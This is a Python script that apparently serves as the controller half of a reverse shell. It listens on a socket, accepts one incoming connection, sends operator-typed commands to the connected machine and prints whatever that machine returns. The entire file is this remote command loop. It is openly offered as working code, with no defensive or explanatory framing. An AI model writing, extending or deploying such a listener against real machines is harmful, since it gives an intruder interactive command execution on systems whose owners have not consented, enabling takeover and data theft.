import socket
import sys
from colorama import Fore

def create_socket():
    try:
        global host
        global port
        global s
        host = "localhost"
        port = 80
        s = socket.socket()
    except socket.error as msg:
        print(Fore.RED + "Socket creation error: " + str(msg))

def bind_socket():
    try:
        global host
        global port
        global s
        print(Fore.GREEN + "Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print(Fore.RED + "Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

def socket_accept():
    conn, address = s.accept()
    print(Fore.GREEN + "Connection has been established! |" + " IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input(Fore.BLUE + "Write What You want to do ")
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()






